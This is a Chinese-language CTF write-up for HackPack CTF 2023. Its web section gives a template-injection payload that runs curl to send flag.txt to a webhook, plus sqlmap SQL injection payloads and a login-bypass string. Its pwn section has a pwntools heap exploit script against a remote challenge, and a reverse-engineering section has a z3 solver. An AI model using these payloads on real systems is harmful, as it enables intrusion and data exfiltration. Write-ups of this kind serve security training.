# HackPack CTF 2023 WP

> 原文: https://www.ctfiot.com/110853.html
> ID: 110853

点击蓝字

关注我们

声明

本文作者：CTF战队本文字数：4318字

阅读时长：约11分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

前言

关注公众号回复 HackPack CTF 2023 下载比赛附件

WEB

issue-tracker
image.png

可用payload

 {{process.mainModule.require('child_process').exec('curl https://webhook.site/3cb22bdf-1ff2-47d5-b99f-d6b7b186398b?$(cat flag.txt | base64)')}}

添加的时候上下都添加一下类似于这样开一个webhook

WolfHowl | SOLVED | working : 1sp

注入点在搜索框，闭合方式为双引号sqlmappayload

---
Parameter: artist (POST)
 Type: boolean-based blind
 Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
 Payload: artist=-3263" OR 7394=7394
#

 Type: error-based
 Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
 Payload: artist=1" AND GTID_SUBSET(CONCAT(0x716a6a7171,(SELECT (ELT(5396=5396,1))),0x7178717871),5396)-- bSiP

 Type: time-based blind
 Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
 Payload: artist=1" AND (SELECT 5372 FROM (SELECT(SLEEP(5)))YAdL)-- yXsn

 Type: UNION query
 Title: MySQL UNION query (NULL) - 4 columns
 Payload: artist=1" UNION ALL SELECT CONCAT(0x716a6a7171,0x63625249444c584a65536b6c4d5465485a4e7777704971536d697a6e66694d534a4b6372577a5953,0x7178717871),NULL,NULL,NULL
#
---

image.png

HackerChat

sql 注入数据是 jwt 格式存储的，登录成功会有回显确认为 sqlite 3.27.2 版本查询表结构但是密码是加密后的，于是我们尝试读取 jwt 形式的留言 可以排除 notes 字段。。不过 notes 里面的 secret reminder 还不清楚是什么

secret reminder: 8vqB5xhrTdPzPDXpSpOTY3oTB3ExpZJdrsFGm/hq/yE=

然后 admin 的加密密码是这个

88f610ef47779376b014e9fea4e0b76c0e4608d5dd339e4f782c8ee41d4f1d2e1d3992d5da8d6ea206da0914d4f30e0903b6a8606772e84bf0d33f0625a4c4c1ca929feef818c0fb82266fc32a31ea0b6a2de955f55a71fdfe0fb7bfa6f48dec

admin 的 notes 是 jwt 的密钥，伪造用户名登录

Pwn

Number Store
image.png

#!/usr/bin/python2
from pwn import *
context(arch='amd64',endian='el',os='linux')
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']

l64 = lambda     :
u64(p.recvuntil("x7f")[-6:].ljust(8,"x00"))
l32 = lambda     :
u32(p.recvuntil("xf7")[-4:].ljust(4,"x00"))
leak  = lambda name,data : p.success(name + ": 0x%x" % data)
sd  = lambda payload: p.send(payload)
sa  = lambda a,b :p.sendafter(str(a),str(b))
sl  = lambda payload: p.sendline(payload)
sla = lambda a,b :p.sendlineafter(str(a),str(b))
ru  = lambda a     :p.recvuntil(str(a))
r  = lambda a     :p.recv(str(a)) 

debug = 2
if debug == 1:
    p = process(['./chall'])
else:
    p = remote('cha.hackpack.club',41705)
elf = ELF('./chall',checksec=False)
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)

def add(index,name,number):
    sla("Choose option: ",1)
    sla(": ",index)
    sla("Enter object name: ",name)
    sla("Enter number: ",number)

def free(index):
    sla("Choose option: ",2)
    sla(": ",index)
    
def edit(index,number):
    sla("Choose option: ",3)
    sla(": ",index)
    sa("Enter new number: ",number)

def show(index):
    sla("Choose option: ",4)
    sla(": ",index)

def addrand():
    sla("Choose option: ",6)
    
add(0,'aaaaaaaa',1)
add(1,'aaaaaaaa',1)
add(2,'aaaaaaaa',1)

free(0)
free(1)
show(1)
heap_base = u64(p.recvuntil("x0a")[-7:-1].ljust(8,'x00')) - 0x3b0

addrand()
show(1)
p.recvuntil("x0a")
main_base = int(p.recvline(),10)
flag = main_base - 57 + 44 - 6
edit(1,str(flag))
sl('')
addrand()
info("heap_base = " + hex(heap_base))
info("main_base = " + hex(main_base))
p.interactive()

flag{n3v3r_tru5t_fr33_jVmVsEuj}

Low Code, Low Security

看题得出是画流程图然后上传，大概画了画如下：由于没有源码，我们得观测一下远程返回，可以看到如下：所有猜测是sql的洞，然后sql注入即可。创建一个账号登录时密码设计为**”admin’ OR ‘1=1″** 然后上传文件，就有flag了flag{eZ_M0n3y!1?}

Misc

Cat Me if You Can

RE

Speed-Rev: Humans

一共有6个level，nc之后，得到第一个

是base64加密后的文件，解密以后，得到elf文件，得到第一个flag

6iSGODh39bqvH0EF

第二个还是base64解密文件，得到

动态的

pSLPV4TH96ZHbNUq

第三个

q2bPAaYuMVl2HLUw

第四个要算线性方程 打算用z3 chatgpt没算出来这个题出的不严谨，多解，但是还没有说是必须在大小写字母和数字之间选择，并且它是动态的套娃，每次都得重新重新做一遍，出的不严谨 z(z3加约束就能解开

from z3 import *

x = [Int(f'x{i}') for i in range(16)]

solver = Solver()

solver.add(x[0] + x[1] == 169)
solver.add(x[1] + x[2] == 214)
solver.add(x[2] + x[3] == 211)
solver.add(x[3] + x[4] == 158)
solver.add(x[4] + x[5] == 148)
solver.add(x[5] + x[6] == 218)
solver.add(x[6] + x[7] == 192)
solver.add(x[7] + x[8] == 158)
solver.add(x[8] + x[9] == 196)
solver.add(x[9] + x[10] == 159)
solver.add(x[10] + x[11] == 168)
solver.add(x[11] + x[12] == 227)
solver.add(x[12] + x[13] == 222)
solver.add(x[13] + x[14] == 218)
solver.add(x[14] + x[15] == 168)

for i in range(16):
 solver.add(Or(
 And(x[i] >= 48, x[i] <= 57), # 48 到57
 And(x[i] >= 65, x[i] <= 90), # 65到90
 And(x[i] >= 97, x[i] <= 122) # 97到122
 ))

if solver.check() == sat:
 model = solver.model()
 result = "".join([chr(model[x[i]].as_long()) for i in range(16)])
 print(result)
else:
 print("unsat")

第五个

第六个

后记

CTF战队持续招新～

简历投至match@wgpsec.org

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
{{process.mainModule.require('child_process').exec('curl https://webhook.site/3cb22bdf-1ff2-47d5-b99f-d6b7b186398b?$(cat flag.txt | base64)')}}
---
Parameter: artist (POST)
 Type: boolean-based blind
 Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
 Payload: artist=-3263" OR 7394=7394
#

 Type: error-based
 Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
 Payload: artist=1" AND GTID_SUBSET(CONCAT(0x716a6a7171,(SELECT (ELT(5396=5396,1))),0x7178717871),5396)-- bSiP

 Type: time-based blind
 Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
 Payload: artist=1" AND (SELECT 5372 FROM (SELECT(SLEEP(5)))YAdL)-- yXsn

 Type: UNION query
 Title: MySQL UNION query (NULL) - 4 columns
 Payload: artist=1" UNION ALL SELECT CONCAT(0x716a6a7171,0x63625249444c584a65536b6c4d5465485a4e7777704971536d697a6e66694d534a4b6372577a5953,0x7178717871),NULL,NULL,NULL
#
---
secret reminder: 8vqB5xhrTdPzPDXpSpOTY3oTB3ExpZJdrsFGm/hq/yE=
88f610ef47779376b014e9fea4e0b76c0e4608d5dd339e4f782c8ee41d4f1d2e1d3992d5da8d6ea206da0914d4f30e0903b6a8606772e84bf0d33f0625a4c4c1ca929feef818c0fb82266fc32a31ea0b6a2de955f55a71fdfe0fb7bfa6f48dec
#!/usr/bin/python2
from pwn import *
context(arch='amd64',endian='el',os='linux')
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']

l64 = lambda     :
u64(p.recvuntil("x7f")[-6:].ljust(8,"x00"))
l32 = lambda     :
u32(p.recvuntil("xf7")[-4:].ljust(4,"x00"))
leak  = lambda name,data : p.success(name + ": 0x%x" % data)
sd  = lambda payload: p.send(payload)
sa  = lambda a,b :p.sendafter(str(a),str(b))
sl  = lambda payload: p.sendline(payload)
sla = lambda a,b :p.sendlineafter(str(a),str(b))
ru  = lambda a     :p.recvuntil(str(a))
r  = lambda a     :p.recv(str(a)) 

debug = 2
if debug == 1:
    p = process(['./chall'])
else:
    p = remote('cha.hackpack.club',41705)
elf = ELF('./chall',checksec=False)
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)

def add(index,name,number):
    sla("Choose option: ",1)
    sla(": ",index)
    sla("Enter object name: ",name)
    sla("Enter number: ",number)

def free(index):
    sla("Choose option: ",2)
    sla(": ",index)
    
def edit(index,number):
    sla("Choose option: ",3)
    sla(": ",index)
    sa("Enter new number: ",number)

def show(index):
    sla("Choose option: ",4)
    sla(": ",index)

def addrand():
    sla("Choose option: ",6)
    
add(0,'aaaaaaaa',1)
add(1,'aaaaaaaa',1)
add(2,'aaaaaaaa',1)

free(0)
free(1)
show(1)
heap_base = u64(p.recvuntil("x0a")[-7:-1].ljust(8,'x00')) - 0x3b0

addrand()
show(1)
p.recvuntil("x0a")
main_base = int(p.recvline(),10)
flag = main_base - 57 + 44 - 6
edit(1,str(flag))
sl('')
addrand()
info("heap_base = " + hex(heap_base))
info("main_base = " + hex(main_base))
p.interactive()
6iSGODh39bqvH0EF
pSLPV4TH96ZHbNUq
q2bPAaYuMVl2HLUw
from z3 import *

x = [Int(f'x{i}') for i in range(16)]

solver = Solver()

solver.add(x[0] + x[1] == 169)
solver.add(x[1] + x[2] == 214)
solver.add(x[2] + x[3] == 211)
solver.add(x[3] + x[4] == 158)
solver.add(x[4] + x[5] == 148)
solver.add(x[5] + x[6] == 218)
solver.add(x[6] + x[7] == 192)
solver.add(x[7] + x[8] == 158)
solver.add(x[8] + x[9] == 196)
solver.add(x[9] + x[10] == 159)
solver.add(x[10] + x[11] == 168)
solver.add(x[11] + x[12] == 227)
solver.add(x[12] + x[13] == 222)
solver.add(x[13] + x[14] == 218)
solver.add(x[14] + x[15] == 168)

for i in range(16):
 solver.add(Or(
 And(x[i] >= 48, x[i] <= 57), # 48 到57
 And(x[i] >= 65, x[i] <= 90), # 65到90
 And(x[i] >= 97, x[i] <= 122) # 97到122
 ))

if solver.check() == sat:
 model = solver.model()
 result = "".join([chr(model[x[i]].as_long()) for i in range(16)])
 print(result)
else:
 print("unsat")
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1681952806.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/1-1681952807.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/10-1681952807.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/3-1681952807.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1681952807.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1681952808.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/5-1681952808.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1681952809.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/7-1681952809.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1681952810.png)